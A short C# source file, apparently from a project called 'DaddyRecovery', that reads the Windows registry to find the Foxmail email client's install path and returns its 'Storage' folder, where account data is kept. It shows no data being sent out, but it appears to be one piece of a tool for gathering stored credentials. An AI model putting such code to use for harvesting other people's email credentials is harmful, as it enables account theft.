namespace DaddyRecovery.Applications
{
    using System;
    using DaddyRecovery.Helpers;
    using Microsoft.Win32;

    public static class FoxMailPath
    {
        public static string GetFoxMail(string root)
        {
            RegistryHive registryHive = RunChecker.IsAdmin ? RegistryHive.LocalMachine : RegistryHive.CurrentUser;
            RegistryView registryView = RunChecker.IsWin64 ? RegistryView.Registry64 : RegistryView.Registry32;
            try
            {
                using (var Fox = RegistryKey.OpenBaseKey(registryHive, registryView))
                using (RegistryKey Key = Fox.OpenSubKey(root, RunChecker.IsWin64))
                {
                    string set = Key?.GetValue("").ToString();
                    return $@"{set.Remove(set.LastIndexOf("Foxmail.exe")).Replace("\"", "")}Storage\";
                }
                
            }
            catch { return string.Empty; }
        }
    }
}